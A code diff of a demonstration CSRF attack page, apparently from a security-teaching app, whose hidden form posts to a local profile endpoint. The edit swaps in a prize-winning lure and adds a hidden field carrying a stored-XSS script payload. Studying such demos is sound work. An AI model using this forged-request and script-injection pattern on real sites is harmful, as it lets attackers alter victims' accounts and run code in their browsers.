@@ -4,13 +4,15 @@
             <div class="row">
                 <div class="col-md-12">
                     <div class="widget wblue">
-                        <div ht-widget-header title="The CSRF Attack"
+                        <div ht-widget-header title="Congratulations!! You have won !!"
                              allow-collapse="true"></div>
                         <div class="widget-content text-center text-info">
                             <form action="http://localhost:3000/api/user/profile" method="POST">
-                                <input type="hidden" name="firstName" value="Evil"></input>
-                                <input type="hidden" name="lastName" value="Hacker"></input>
-                                <input type="submit" value="Click to view awesome pictures of dogs!"/>
+                                <!-- <input type="hidden" name="firstName" value="Evil"></input>
+                                <input type="hidden" name="lastName" value="Hacker"></input> -->
+                                <input type="hidden" name="firstName" value="Hello"></input>
+                                <input type="hidden" name="lastName" value="<script>alert('Game Over');console.log(2)</script>"></input>
+                                <input type="submit" value="Click to claim your prize!"/>
                             </form>
                         </div>
                         <div class="widget-foot">
@@ -22,6 +24,6 @@
         </div>
     </section>
     <script>
-        document.forms[0].submit();
+        // document.forms[0].submit();
     </script>
 </section>
